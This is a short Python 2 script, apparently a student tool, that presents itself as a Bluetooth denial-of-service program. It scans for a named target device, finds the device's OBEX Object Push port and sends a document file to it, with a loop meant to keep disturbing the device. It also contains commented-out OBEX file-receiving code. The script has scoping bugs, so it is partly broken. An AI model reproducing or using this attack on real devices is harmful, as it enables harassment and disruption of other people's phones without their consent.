#**********************************************************************************************
#!/usr/bin/python
# file: Dos_docs.py
# auth: Anjana Rajan_created-on - 10-06-2017
# desc: simple program that continously disturb the target device by sending files
#**********************************************************************************************
# Prerequisite-
# Devices should be paired
#**********************************************************************************************
import bluetooth
import lightblue
import time
target_name = None
file_to_send = "/home/csti-laptop/Desktop/anjana/Updates.doc"
obex_port = None
target_addr = None
################################################################################
# Function 1
################################################################################
def attack():
	try:
		print "Searching nearby devices....\n"
		near_by_devices = bluetooth.discover_devices()
	
		for bdaddr in near_by_devices:
			print bluetooth.lookup_name(bdaddr)
			print "\n"
			if target_name == bluetooth.lookup_name(bdaddr):
				print "Found the target device"
				target_addr = bdaddr
				print target_addr
				print "\n"
				break
		print "Searching services available in target device "
		services = lightblue.findservices(target_addr)
		print services
		print "\n"
		for service in services:
			if service[2] == "OBEX Object Push":
				obex_port = service[1]
				print "OK, service '", service[2], "' is in port", service[1], "!"
				break
#To send and receive files over OBEX:
		f=1
		while f==1 :
			print "Sending a file... "
			try:
				#print file_to_send
				lightblue.obex.sendfile( target_addr, service[1], file_to_send )
				print "*** Hit crtl+z to stop ***"
		 		time.sleep(2)
				print "completed!\n" 
				f=0
			except:
				print "An error occured while sending \n"
				print "*** Hit crtl+z to stop ***"
	except:
		print"Not paired or discoverbale mode"
'''
#***********************************************************************
#Case 1
########################################################################
 # receive a file and save it as MyFile.txt


s = lightblue.socket()
try:
	s.bind(("",0))
	lightblue.advertise("OBEX Object Push",s,lightblue.OBEX)
	lightblue.obex.recvfile(s,file_to_receive)
finally:
	s.close()
print "Saved received file to MyFile.txt!"

#########################################################################
#************************************************************************
'''
'''
#Case 2
#########################################################################

# bind the socket, and advertise an OBEX service
sock = lightblue.socket()
try:
    sock.bind(("", 0))    # bind to 0 to bind to a dynamically assigned channel
    lightblue.advertise("OBEX File Transfer", sock, lightblue.OBEX)
    
    # Receive a file and save it as MyFile.txt. 
    # This will wait and block until a file is received.
    print "Waiting to receive file on channel %d..." % sock.getsockname()[1]
    lightblue.obex.recvfile(sock, "MyFile.txt")
    
finally:
    sock.close()
    
print "Saved received file to MyFile.txt!"

'''
###################################################################################
# Main Function
###################################################################################
if __name__ == '__main__':
	target_name = raw_input("Enter the target device name : ")
	print "\n"
	attack()
